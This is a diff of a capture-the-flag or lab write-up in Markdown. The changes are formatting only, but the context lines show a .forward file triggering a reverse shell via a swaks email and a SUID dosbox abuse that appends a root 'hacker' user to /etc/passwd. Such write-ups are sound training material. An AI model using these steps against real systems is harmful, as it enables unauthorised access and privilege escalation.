@@ -207,15 +207,13 @@ Whenever the user receives mail, this output of the mail is piped to this binary
 
 Then, replace the `.forward` file in the share and send `fox@localhost` an email via `swaks`:
 
-{% code overflow="wrap" %}
 ```
 $ swaks --to fox@localhost --from test@localhost --header "Subject:Password Reset" --body "yo" --server 192.168.157.157
 ```
-{% endcode %}
 
 This would give us a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (2780).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2780).png>)
 
 ## Privilege Escalation
 
@@ -274,17 +272,17 @@ ssh mara@192.168.0.191
 
 This password works for `fox`.
 
-<figure><img src="../../../.gitbook/assets/image (3455).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3455).png>)
 
 ### Dosbox SUID -> Root
 
 We can use the `-X` option after finding the user's password:
 
-<figure><img src="../../../.gitbook/assets/image (1998).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1998).png>)
 
 I tested by running `dosbox`, which spawns the GUI for me:
 
-<figure><img src="../../../.gitbook/assets/image (3735).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3735).png>)
 
 We can then run this:
 
@@ -294,7 +292,7 @@ dosbox -c 'mount c /' -c "type c:$LFILE"
 
 This would mount the Linux file system within the C Drive of the termnal:
 
-<figure><img src="../../../.gitbook/assets/image (3734).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3734).png>)
 
 To exploit this, first create a new hash:
 
@@ -318,4 +316,4 @@ type C:/home/fox/easy >> C:/etc/passwd
 
 We can then `ssh` in using the new `hacker` user:
 
-<figure><img src="../../../.gitbook/assets/image (3201).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3201).png>)
